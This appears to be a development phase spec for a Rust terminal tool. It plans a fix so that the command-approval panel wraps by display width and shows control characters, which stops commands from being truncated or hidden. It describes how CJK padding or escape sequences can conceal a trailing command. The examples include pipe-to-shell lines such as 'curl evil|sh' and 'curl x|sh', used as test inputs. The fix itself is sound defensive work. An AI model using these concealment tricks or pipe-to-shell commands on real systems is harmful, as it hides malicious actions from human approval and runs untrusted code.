# Phase 05a — panel-wrap

**Milestone:** M36 — Chat UX and audit fixes
**Status:** todo
**Drafted:** 2026-11-04 (05 split into 05a/05b at drafting)
**Depends on:** none
**Estimated diff:** ~200 lines
**Tags:** language=rust, kind=security, size=s

## Goal

Finding S1 (critical, `FINDINGS.md`): the approval panel can hide the end of
the command it asks the user to approve. `wrap_line_hard` (`src/cli/render.rs`)
counts chars rather than display columns, treats everything after an ESC as
zero-width until the next ASCII letter, and `commit_panel_labeled`
(`src/cli/render_ratatui_draw.rs`) draws each row unwrapped, so whatever
passes the right edge is cut without a marker. On 80 columns,
`echo <36 CJK chars>; curl evil|sh` shows only `$ echo 漢…漢`, and
`echo ok \x1b<60 spaces>; curl x|sh` shows `$ echo ok`. This phase replaces
the wrapper with one that measures display width and shows control
characters as visible text.

## Architecture references

- `src/cli/render.rs` · `wrap_line_hard` and its two callers:
  `render_ratatui_draw.rs` · `commit_panel_labeled` (the approval and info
  panels) and `viewer_layout.rs` · `push_wrapped_hard` (the viewer's
  machine-output rows).
- `src/cli/render_ratatui_tests.rs` · `make_test_renderer` and the
  `commit_panel_*` tests, for driving a panel on a `TestBackend`.

## Behaviour

**The wrapper.** A new `wrap_display(text, width) -> Vec<String>` in
`src/cli/render.rs` replaces `wrap_line_hard`, and `wrap_line_hard` is
deleted. `\n` is a hard break, as today. Every row's display width, measured
with `unicode-width`, is at most `width` columns. A character that does not
fit in the rest of the row starts the next one: a wide character is never
split across the edge, and no character is dropped. With every escape below
undone, joining the rows gives back the input.

**Visible controls.** Every control character except `\n` is shown as text,
in a form a reader can recognise: C0 controls (`U+0000`–`U+001F`, including
ESC, BEL, tab and CR), DEL (`U+007F`), C1 controls (`U+0080`–`U+009F`,
including the 8-bit CSI `U+009B`), and the bidi and invisible format
characters (`U+200B`–`U+200F`, `U+202A`–`U+202E`, `U+2066`–`U+2069`,
`U+FEFF`). Pick one form per class (for example `\x1b`, `\u{202e}`) and use
it throughout. Escape forms count toward the width like any other text and
are never split across rows. No row ever contains one of those characters
raw.

**Must stay unchanged:** plain ASCII, `\n` breaks, accented letters (`é`),
CJK and emoji. They pass through as themselves and are measured by their
real width.

**Callers.** `commit_panel_labeled` and `push_wrapped_hard` call
`wrap_display`. Neither changes otherwise.

## Constraints

- Add `unicode-width = "0.2.3"` to `[dependencies]` in `Cargo.toml`. That
  version is already in `Cargo.lock` through ratatui, so the build fetches
  nothing.
- The markdown committer (`visual_len`, `render_line_to_spans`) and the
  viewer's word wrap (`wrap_words`) are phase 05b. Leave them and
  `visual_len` as they are.
- Diff bodies reach the screen through `renderer.commit`, not the panel,
  and are phase 06's.

## Spec

1. **Red tests first.** Write these against the current tree, stubbing
   `wrap_display` if needed, run them, and keep the failing output for
   step 4:
   - `wrap_display_counts_columns_not_chars`: 36 CJK chars at width 20.
     No row is wider than 20 columns, and the rows join back to the input.
   - `wrap_display_never_splits_a_wide_char`: CJK at an odd width (5).
     Each row holds two of them (4 columns), none is wider than 5, and
     nothing is lost.
   - `wrap_display_shows_control_characters`: the S1 ESC example, plus BEL,
     tab, DEL, `U+009B` and `U+202E`. Each appears in its visible form, no
     row contains it raw, and `curl x|sh` is in the output.
   - `wrap_display_leaves_plain_text_alone`: ASCII, `\n`, `é`, CJK and an
     emoji come back unchanged, row for row.
   - `wrap_display_approval_panel_shows_the_whole_command`: on an 80-column
     `TestBackend`, `commit_panel_labeled` with each S1 example. The
     committed screen contains the command's tail (`curl evil|sh` and
     `curl x|sh`), and no row is wider than the terminal.
2. **The wrapper and the callers**, per § Behaviour. Delete `wrap_line_hard`
   and its test in `src/cli/tests.rs`.
3. **Run tests**: `cargo test` passes with `failed=0`.
4. **Red runs.** Add one `### Update — <date> (red runs)` entry that pastes
   step 1's `test result:` lines and assertion messages verbatim from the
   run's output.
5. **Findings.** Add one `### Findings — <date>` entry, two or three lines,
   or `none`.
6. **End-to-end.** Run § End-to-end verification once and paste its
   output, fenced, in an `### Update — <date> (end-to-end verification)`
   entry.
7. **Commit** as `fix: the approval panel wraps by display width and shows control characters (M36 phase-05a)`.

## Acceptance criteria

- [ ] The E2E block's first line is `panel_wrap passed=5 failed=0` (today 0).
- [ ] `wrap_line_hard=0`: no `wrap_line_hard` left under `src/` (today 6).
- [ ] The E2E block shows `unicode_width_dep=1` (today 0).
- [ ] The red-runs entry shows the new tests failing on the pre-phase code.
- [ ] Preservation: the existing `commit_panel_*`, `viewer` and `wrap_words_*`
      tests pass.
- [ ] The E2E block shows `hygiene`, `doc_truth` and `bug_tracker` `ok`,
      `build_warnings=0`, clippy clean, `fmt_exit=0` and `failed=0`.

## End-to-end verification

```sh
bash <<'E2E'
cargo test wrap_display_ 2>&1 | grep -E '^test result' | awk '{p+=$4; f+=$6} END {print "panel_wrap passed=" p, "failed=" f}'
grep -rn 'wrap_line_hard' src/ | wc -l | sed 's/^/wrap_line_hard=/'
grep -c '^unicode-width' Cargo.toml | sed 's/^/unicode_width_dep=/'
touch src/main.rs && cargo build 2>&1 | grep -c '^warning' | sed 's/^/build_warnings=/'
for t in hygiene doc_truth bug_tracker; do cargo test --test $t 2>&1 | grep -E '^test result'; done
cargo clippy --all-targets --all-features -- -D warnings 2>&1 | tail -1
cargo fmt --all --check; echo "fmt_exit=$?"
cargo test 2>&1 | grep -E '^test result' | awk '{p+=$4; f+=$6} END {print "passed=" p, "failed=" f}'
E2E
```

## Authorizations

- Edit `src/cli/render.rs`, `src/cli/render_ratatui_draw.rs`,
  `src/cli/viewer_layout.rs`, `src/cli/tests.rs`,
  `src/cli/render_ratatui_tests.rs` and `Cargo.toml` (one dependency line).
  `Cargo.lock` may change only to record that dependency.

## Out of scope

- The markdown committer and `wrap_words`, which are phase 05b. Diff
  styling is phase 06.
- Changing what the daemon sends or runs. The command is already sent
  unchanged; this phase changes only what the user sees.

## Update Log

<!-- entries appended below this line -->
